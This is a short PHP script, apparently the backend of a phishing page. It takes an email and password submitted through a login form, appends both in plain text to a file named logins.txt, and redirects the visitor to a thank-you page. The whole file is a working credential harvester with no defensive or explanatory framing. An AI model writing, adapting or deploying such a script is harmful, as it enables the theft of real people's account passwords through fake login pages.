<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST['email'];
    $password = $_POST['pass'];

    // Sanitize input
    $email = filter_var($email, FILTER_SANITIZE_EMAIL);
    $password = filter_var($password, FILTER_SANITIZE_STRING);

    // Create a string to write to the file
    $logEntry = "Email: " . $email . " - Password: " . $password . PHP_EOL;

    // Define the file path
    $file = 'logins.txt';

    // Write the log entry to the file
    file_put_contents($file, $logEntry, FILE_APPEND);

    // Redirect to a thank you or success page (optional)
    header('Location: thank_you.html');
    exit();
}
?>
